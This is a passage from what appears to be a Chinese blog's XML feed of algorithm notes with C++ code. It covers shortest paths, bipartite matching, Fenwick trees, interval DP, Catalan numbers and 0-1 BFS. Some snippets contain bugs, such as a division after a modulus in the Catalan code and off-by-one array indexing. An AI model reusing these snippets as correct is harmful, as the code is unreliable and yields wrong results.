class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span><span class="hljs-comment">//整体思路，dist代表到超级源点的距离。</span></span><br><span class="hljs-function"></span>&#123;<br>    queue&lt;<span class="hljs-type">int</span>&gt;q;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        q.<span class="hljs-built_in">push</span>(i);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        <span class="hljs-type">int</span> u= q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        vis[u] =<span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;vp:gra[u])<br>        &#123;<br>            <span class="hljs-type">int</span> v = vp.first;<br>            <span class="hljs-type">int</span> d = vp.second;<br>            <span class="hljs-keyword">if</span>(dist[v]&gt;dist[u]+d)<br>            &#123;<br>                dist[v] =dist[u]+d;<br>                cnt[v] = cnt[u]+<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span>(cnt[v]&gt;=n) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<span class="hljs-comment">//抽屉原理，边数超过了点数。存在负环。</span><br>                <span class="hljs-keyword">if</span>(!vis[v])<br>                &#123;<br>                    q.<span class="hljs-built_in">push</span>(v);<br>                    vis[v] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Floyd算法可以用来解决多源最短路径问题，它的思想基于动态规划。<br>从点i到点j的最短路径，要么由i直接到j，要么是由i经过点k再到达点j。点i到点j的最小值只能从这两种状态转移过来，从而建立动态规划转移方程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">floyd</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">1</span>;k&lt;=n;k++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>            &#123;<br>                d[i][j] =<span class="hljs-built_in">min</span>(d[i][j],d[i][k]+d[k][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>匈牙利算法</title>
    <link href="/2022/07/17/%E5%8C%88%E7%89%99%E5%88%A9%E7%AE%97%E6%B3%95/"/>
    <url>/2022/07/17/%E5%8C%88%E7%89%99%E5%88%A9%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h4 id="染色法判断二分图"><a href="#染色法判断二分图" class="headerlink" title="染色法判断二分图"></a>染色法判断二分图</h4><p>染色法判断二分图的原理：二分图中不存在奇数环（节点数为奇数的环），因此图中相邻两点颜色均应该不同。可以用此方法来判断二分图。<br>模板题目：<a href="https://www.acwing.com/problem/content/862/">https://www.acwing.com/problem/content/862/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">gra</span>(N,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br>vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">color</span>(N,<span class="hljs-number">0</span>);<br><span class="hljs-type">int</span> m,n,v,u;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u,<span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    color[u] = c;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>&amp;v:gra[u])<span class="hljs-comment">//对所有相邻节点进行染色</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(!color[v])<span class="hljs-comment">//若没被染色</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">dfs</span>(v,<span class="hljs-number">3</span>-c))<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//递归染上不同的颜色</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(color[v]!=<span class="hljs-number">3</span>-c)<span class="hljs-comment">//若已被染色，则判断是否颜色不同。</span><br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;u,&amp;v);<br>        gra[u].<span class="hljs-built_in">push_back</span>(v);<span class="hljs-comment">//无向图</span><br>        gra[v].<span class="hljs-built_in">push_back</span>(u);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!color[i])<br>        &#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">dfs</span>(i,<span class="hljs-number">1</span>))<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Yes&quot;</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><h4 id="匈牙利算法"><a href="#匈牙利算法" class="headerlink" title="匈牙利算法"></a>匈牙利算法</h4><p>匈牙利算法用来求二分图的最大匹配。<br>二分图的匹配：给定一个二分图 G，在 G 的一个子图 M 中，M 的边集 {E} 中的任意两条边都不依附于同一个顶点，则称 M 是一个匹配。<br>二分图的最大匹配：所有匹配中包含边数最多的一组匹配被称为二分图的最大匹配，其边数即为最大匹配数。<br>模板题目：<a href="https://www.acwing.com/problem/content/description/863/">https://www.acwing.com/problem/content/description/863/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1001</span>;<br><span class="hljs-type">int</span> n1,n2,m,u,v;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">gra</span>(N,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br>vector&lt;<span class="hljs-type">bool</span>&gt;vis;<br>vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">match</span>(N,<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>&amp;v:gra[x])<span class="hljs-comment">//遍历所有可能匹配的点</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(!vis[v])<span class="hljs-comment">//如果另一方还没有被考虑</span><br>        &#123;<br>            vis[v]=<span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span>(match[v]==<span class="hljs-number">0</span> || <span class="hljs-built_in">find</span>(match[v]))<span class="hljs-comment">//若另一方没有匹配对象或者其匹配对象能够更换成另外的匹配对像</span><br>            &#123;<br>                match[v] =x;<span class="hljs-comment">//匹配成功</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>,&amp;n1,&amp;n2,&amp;m);<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;u,&amp;v);<br>        gra[u].<span class="hljs-built_in">push_back</span>(v);<span class="hljs-comment">//只加入一边，当成有向图</span><br>    &#125;<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n1;i++)<br>    &#123;<br>        vis = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt;(n2,<span class="hljs-literal">false</span>);<span class="hljs-comment">//每次重置，所有另一方被考虑的状态。</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">find</span>(i)) ++res;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,res);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>decltype函数</title>
    <link href="/2022/07/11/decltype/"/>
    <url>/2022/07/11/decltype/</url>
    
    <content type="html"><![CDATA[<p>decltype可以作用于变量、表达式及函数名。①作用于变量直接得到变量的类型；②作用于表达式，结果是左值的表达式得到类型的引用，结果是右值的表达式得到类型；③作用于函数名会得到函数类型，不会自动转换成指针。</p><p>decltype不会去真的求解表达式的值。<br>————————————————<br>版权声明：本文为CSDN博主「Jinxk8」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/u014609638/article/details/106987131/">https://blog.csdn.net/u014609638/article/details/106987131/</a></p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>三向切分问题</title>
    <link href="/2022/07/09/%E4%B8%89%E5%90%91%E5%88%87%E5%88%86(%E8%8D%B7%E5%85%B0%E5%9B%BD%E6%97%97%E9%97%AE%E9%A2%98)/"/>
    <url>/2022/07/09/%E4%B8%89%E5%90%91%E5%88%87%E5%88%86(%E8%8D%B7%E5%85%B0%E5%9B%BD%E6%97%97%E9%97%AE%E9%A2%98)/</url>
    
    <content type="html"><![CDATA[<p><a href="https://leetcode.cn/problems/sort-colors/">https://leetcode.cn/problems/sort-colors/</a><br>数据特殊，可利用排序直接得到答案啊,也可以利用双指针法。<br>设置两个指针l,r。l从0开始，r从末尾开始。遍历数组，当i遇到0时与l指针元素互换位置。当遇到2时与r指针互换位置。注意到：与r互换位置后，nums[i]有可能仍为2,所以需要循环进行交换判断。 与l交换时没有这样的问题，因为i为从左到右扫描，不可能交换后仍为0。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sortColors</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> r =nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;r;i++)<br>        &#123;<br>            <span class="hljs-keyword">while</span>(i&lt;=r &amp;&amp; nums[i]==<span class="hljs-number">2</span>)<br>            &#123;<br>                <span class="hljs-built_in">swap</span>(nums[i],nums[r]);<br>                --r;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(nums[i]==<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">swap</span>(nums[i],nums[l]);<br>                ++l;<br>            &#125;<br>        &#125;<br>     &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>区间dp</title>
    <link href="/2022/07/04/%E5%8C%BA%E9%97%B4dp/"/>
    <url>/2022/07/04/%E5%8C%BA%E9%97%B4dp/</url>
    
    <content type="html"><![CDATA[<p>例题:<a href="https://www.acwing.com/problem/content/284/">https://www.acwing.com/problem/content/284/</a><br>简易描述：有N堆石子，将N堆石子合并成一堆，只能合并相邻两堆石子，选择的总代价为两堆石子总和。</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">305</span>;<br><span class="hljs-type">int</span> pre[N];<br><span class="hljs-type">int</span> dp[N][N];<span class="hljs-comment">//合并区间i,j的最小值。</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> inf =INT_MAX/<span class="hljs-number">2</span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;pre[i], pre[i] +=pre[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-comment">//枚举区间最小值</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> len=<span class="hljs-number">2</span>;len&lt;=n;len++)<br>    &#123;<br>        <span class="hljs-comment">//枚举左区间</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i+len<span class="hljs-number">-1</span>&lt;=n;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> j =i+len<span class="hljs-number">-1</span>;<span class="hljs-comment">//右端点。</span><br>            dp[i][j] = inf;<span class="hljs-comment">//初始化成最大值</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=i;k&lt;=j;k++)<span class="hljs-comment">//枚举中间的分界点</span><br>            &#123;<br>                <span class="hljs-comment">//状态转移计算最小值</span><br>                dp[i][j] =<span class="hljs-built_in">min</span>(dp[i][j],dp[i][k]+dp[k+<span class="hljs-number">1</span>][j]+pre[j]-pre[i<span class="hljs-number">-1</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;dp[<span class="hljs-number">1</span>][n]&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>树状数组</title>
    <link href="/2022/06/10/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    <url>/2022/06/10/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<p>树状数组用来解决单点修改和区间查询时，代码实现比线段树简单。<br>在树状数组t中，t[x]，x表示t[x]覆盖的长度。<br><img src="/upload/2022/06/image-0abb10dc93ed4b4488c38a0439d9dab9.png" alt="image.png"></p><h4 id="lowbit操作"><a href="#lowbit操作" class="headerlink" title="lowbit操作"></a>lowbit操作</h4><p>可以知道数值x的二进制最低位的1及后面的0表示的数字</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> x &amp; -x;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="单点修改"><a href="#单点修改" class="headerlink" title="单点修改"></a>单点修改</h4><p>下标x每次加lowbit(x)即可找到其父亲节点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs language">void add(int x, int k) &#123;<br>  while (x &lt;= n) &#123;  <br>    c[x] = c[x] + k;<br>    x = x + lowbit(x);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="区间查询"><a href="#区间查询" class="headerlink" title="区间查询"></a>区间查询</h4><p>下标x每次减lowbit(x)即可得到前面覆盖一层的节点下标。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//前缀和</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getsum</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;  <span class="hljs-comment">// a[1]..a[x]的和</span><br>  <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> (x &gt;= <span class="hljs-number">1</span>) &#123;<br>    ans = ans + c[x];<br>    x = x - <span class="hljs-built_in">lowbit</span>(x);<br>  &#125;<br>  <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>卡特兰数</title>
    <link href="/2022/05/25/%E5%8D%A1%E7%89%B9%E5%85%B0%E6%95%B0/"/>
    <url>/2022/05/25/%E5%8D%A1%E7%89%B9%E5%85%B0%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h4 id="卡特兰数的几何意义"><a href="#卡特兰数的几何意义" class="headerlink" title="卡特兰数的几何意义"></a>卡特兰数的几何意义</h4><p>简单来说，卡特兰数就是一个有规律的数列，在坐标图中可以表示为：从原点(0,0)出发，每次向x轴或者y轴正方向移动1个单位，直到到达(n,n)点，且在移动过程中不越过第一象限平分线的移动方案总数。<br><img src="/upload/2022/05/image-c709df97ebe74d4cae1f48b0e8db63f1.png" alt="image.png"><img src="/upload/2022/05/image-4042be22d04f4ffba166e20307b8d107.png" alt="image.png"><br>模板题:<a href="https://www.acwing.com/activity/content/problem/content/959/">https://www.acwing.com/activity/content/problem/content/959/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> p =<span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">200005</span>;<br><span class="hljs-type">int</span> fact[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">qkm</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res =(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*a%p;<br>        <span class="hljs-comment">//cout&lt;&lt;res&lt;&lt;endl;</span><br>        b&gt;&gt;=<span class="hljs-number">1</span>;<br>        a=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a%p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    fact[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=N;i++)<br>    &#123;<br>        fact[i] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fact[i<span class="hljs-number">-1</span>]*i%p;<br>        <span class="hljs-comment">//cout&lt;&lt;fact[i]&lt;&lt;endl;</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">2</span>*n;<br>    <span class="hljs-type">int</span> b = n;<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-type">int</span> ans = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fact[a]*<span class="hljs-built_in">qkm</span>(fact[a-b],p<span class="hljs-number">-2</span>)%p;<br>    ans = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ans*<span class="hljs-built_in">qkm</span>(fact[b],p<span class="hljs-number">-2</span>)%p;<br>    <span class="hljs-comment">// cout&lt;&lt;ans&lt;&lt;endl;</span><br>    cout&lt;&lt;(ans/(n+<span class="hljs-number">1</span>))%p&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>0-1BFS</title>
    <link href="/2022/05/22/0-1BFS/"/>
    <url>/2022/05/22/0-1BFS/</url>
    
    <content type="html"><![CDATA[<p>求单源最短路径，边权有的为0，有的为1。<br>一般的BFS，每个边的边权都为1，保证广度优先搜索正确性的基础在于：对于源点 s 以及任意两个节点 u 和 v，如果dist[u]&lt; dist[v]。那么节点 u 一定会比节点 v 先被取出队列。在常规的广度优先搜索中，我们使用队列作为维护节点的数据结构，就保证了从队列中取出的节点，它们与源点之间的距离是单调递增的。然而如果边权可能为 0，就会出现先将边权值为1的点加入队列再将边权值为0的点加入队列，这样在取出队列时，到源点之间的距离便不是单调递增的了，违反了广度优先搜索正确性的基础。于是我们用双向队列来作为维护节点的数据结构，当权值为0时，将其加入队首，当权值为1时，将其加入队尾。这样以来，我们保证了任意时刻从队首到队尾的所有节点，它们与源点之间的距离是单调递增的，即从队列中取出的节点与源点之间的距离同样是单调递增的。<br>例题：<a href="https://leetcode.cn/problems/minimum-obstacle-removal-to-reach-corner/">https://leetcode.cn/problems/minimum-obstacle-removal-to-reach-corner/</a><br>代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title 